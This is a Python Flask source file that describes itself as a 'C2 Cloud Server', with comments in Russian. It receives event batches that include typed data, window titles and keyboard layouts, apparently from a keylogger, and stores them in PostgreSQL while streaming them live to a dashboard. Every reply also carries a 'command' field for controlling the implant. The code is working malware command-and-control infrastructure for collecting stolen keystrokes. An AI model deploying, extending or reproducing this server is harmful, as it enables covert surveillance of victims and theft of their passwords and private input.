import os
import json
import psycopg2
from datetime import datetime
from flask import Flask, request, jsonify
from flask_socketio import SocketIO

app = Flask(__name__)
app.config['SECRET_KEY'] = 'cyber_override_secret'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

DATABASE_URL = os.environ.get("DATABASE_URL")

def get_db_connection():
    if not DATABASE_URL:
        raise Exception("DATABASE_URL is missing")
    # psycopg2 сам разбирает URL и сам делает SSL
    return psycopg2.connect(DATABASE_URL)

def init_db():
    try:
        conn = get_db_connection()
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS logs (
            id SERIAL PRIMARY KEY,
            event_id TEXT UNIQUE,
            timestamp TEXT,
            type TEXT,
            data TEXT,
            win_title TEXT,
            layout TEXT
        )''')
        conn.commit()
        conn.close()
        print("[+] БАЗА ДАННЫХ УСПЕШНО ПОДКЛЮЧЕНА!")
    except Exception as e:
        print(f"[-] Ошибка подключения к БД: {e}")

init_db()

@app.route('/')
def index():
    return "C2 Cloud Server is running! Database is connected."

@app.route('/log', methods=['POST'])
def log():
    conn = None
    try:
        raw_data = request.get_data(as_text=True)
        data = json.loads(raw_data)
        
        event_id = data.get("event_id")
        timestamp = data.get("timestamp", datetime.now().isoformat())
        events = data.get("events", [])

        conn = get_db_connection()
        c = conn.cursor()

        for ev in events:
            c.execute('''INSERT INTO logs (event_id, timestamp, type, data, win_title, layout) 
                         VALUES (%s, %s, %s, %s, %s, %s) 
                         ON CONFLICT (event_id) DO NOTHING''', 
                      (event_id, timestamp, ev.get("type"), ev.get("data"), 
                       ev.get("window"), ev.get("layout")))
            
            socketio.emit('new_log', {
                'time': datetime.now().strftime("%H:%M:%S"),
                'type': ev.get("type"),
                'data': ev.get("data"),
                'window': ev.get("window")
            })

        conn.commit()
        print(f"[+] Записано {len(events)} событий в базу!")
        return jsonify({"status": "ok", "command": "none", "server_time": datetime.now().isoformat()})
        
    except Exception as e:
        print(f"[-] Ошибка обработки пакета: {e}")
        return jsonify({"status": "error", "command": "none"}), 200
    finally:
        if conn:
            conn.close()

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    socketio.run(app, host='0.0.0.0', port=port)